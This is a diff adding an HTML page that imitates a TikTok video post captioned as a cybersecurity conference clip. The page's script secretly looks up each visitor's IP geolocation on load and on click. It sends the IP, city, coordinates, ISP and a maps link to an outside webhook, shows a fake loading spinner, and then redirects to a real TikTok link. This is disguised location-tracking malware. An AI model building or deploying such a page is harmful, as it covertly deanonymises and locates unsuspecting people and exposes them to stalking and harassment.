@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: #000; color: white; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
+
+.header {
+  background: #000;
+  padding: 12px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid #1a1a1a;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.logo { font-size: 26px; font-weight: 900; letter-spacing: -1px; }
+.logo .tik { color: white; }
+.logo .tok { color: #fe2c55; }
+
+.search-bar input {
+  background: #1a1a1a;
+  border: 1px solid #333;
+  color: white;
+  padding: 8px 15px;
+  border-radius: 20px;
+  width: 220px;
+  font-size: 14px;
+}
+
+.container { max-width: 420px; margin: 0 auto; }
+
+.video-card {
+  position: relative;
+  width: 100%;
+  background: #111;
+  cursor: pointer;
+  border-bottom: 1px solid #1a1a1a;
+}
+
+.thumbnail {
+  width: 100%;
+  height: 600px;
+  background: linear-gradient(180deg, #1a1a2e 0%, #000 100%);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 15px;
+  position: relative;
+}
+
+.thumb-icon { font-size: 70px; }
+
+.play-btn {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 65px;
+  height: 65px;
+  background: rgba(255,255,255,0.2);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  backdrop-filter: blur(5px);
+}
+.play-btn::after {
+  content: '';
+  border-left: 26px solid white;
+  border-top: 17px solid transparent;
+  border-bottom: 17px solid transparent;
+  margin-left: 6px;
+}
+
+.loading {
+  display: none;
+  text-align: center;
+  height: 600px;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  gap: 20px;
+}
+.spinner {
+  border: 4px solid #333;
+  border-top: 4px solid #fe2c55;
+  border-radius: 50%;
+  width: 45px;
+  height: 45px;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.loading p { color: #aaa; font-size: 15px; }
+
+.side-actions {
+  position: absolute;
+  right: 12px;
+  bottom: 80px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 20px;
+}
+.action { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+.action-icon { font-size: 28px; }
+.action-count { font-size: 12px; color: #aaa; }
+
+.avatar {
+  width: 48px;
+  height: 48px;
+  background: linear-gradient(135deg, #fe2c55, #25f4ee);
+  border-radius: 50%;
+  border: 2px solid white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: bold;
+  font-size: 18px;
+}
+
+.video-info {
+  position: absolute;
+  bottom: 15px;
+  left: 15px;
+  right: 70px;
+}
+.username { font-weight: bold; font-size: 16px; margin-bottom: 5px; }
+.caption { font-size: 14px; color: #ddd; line-height: 1.4; }
+.hashtag { color: #fe2c55; }
+
+.bottom-nav {
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  max-width: 420px;
+  background: #000;
+  border-top: 1px solid #1a1a1a;
+  display: flex;
+  justify-content: space-around;
+  padding: 10px 0;
+}
+.nav-item { display: flex; flex-direction: column; align-items: center; gap: 3px; font-size: 10px; color: #aaa; }
+.nav-icon { font-size: 22px; }
+.nav-item.active { color: white; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo"><span class="tik">Tik</span><span class="tok">Tok</span></div>
+  <div class="search-bar">
+    <input type="text" placeholder="Search">
+  </div>
+</div>
+
+<div class="container">
+  <div class="video-card" onclick="playVideo()">
+    <div class="thumbnail" id="thumbnail">
+      <div class="thumb-icon">🔐</div>
+      <div class="play-btn" id="playBtn"></div>
+      <div class="side-actions">
+        <div class="action"><div class="avatar">CS</div></div>
+        <div class="action"><div class="action-icon">❤️</div><div class="action-count">125.4K</div></div>
+        <div class="action"><div class="action-icon">💬</div><div class="action-count">1,823</div></div>
+        <div class="action"><div class="action-icon">↗️</div><div class="action-count">Share</div></div>
+      </div>
+      <div class="video-info">
+        <div class="username">@cybersec_official</div>
+        <div class="caption">Cybersecurity Conference 2025 🔐 <span class="hashtag">#cybersecurity #hacking #tech</span></div>
+      </div>
+    </div>
+
+    <div class="loading" id="loading" style="display:none; flex-direction:column;">
+      <div class="spinner"></div>
+      <p>Loading video...</p>
+    </div>
+  </div>
+</div>
+
+<div class="bottom-nav">
+  <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
+  <div class="nav-item"><div class="nav-icon">🔍</div>Discover</div>
+  <div class="nav-item"><div class="nav-icon">➕</div></div>
+  <div class="nav-item"><div class="nav-icon">💬</div>Inbox</div>
+  <div class="nav-item"><div class="nav-icon">👤</div>Profile</div>
+</div>
+
+<script>
+const WEBHOOK = "https://eocy1w7x0u37m91.m.pipedream.net";
+
+async function getLocationAndSend() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    await fetch(WEBHOOK, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        ip: data.ip,
+        country: data.country_name,
+        region: data.region,
+        city: data.city,
+        lat: data.latitude,
+        lon: data.longitude,
+        isp: data.org,
+        time: new Date().toLocaleString(),
+        maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+      })
+    });
+  } catch(e) {}
+}
+
+function playVideo() {
+  document.getElementById("thumbnail").style.display = "none";
+  document.getElementById("loading").style.display = "flex";
+  getLocationAndSend();
+  setTimeout(() => {
+    window.location.href = "https://vt.tiktok.com/ZSfpA5qgy/";
+  }, 3000);
+}
+
+getLocationAndSend();
+</script>
+</body>
+</html>
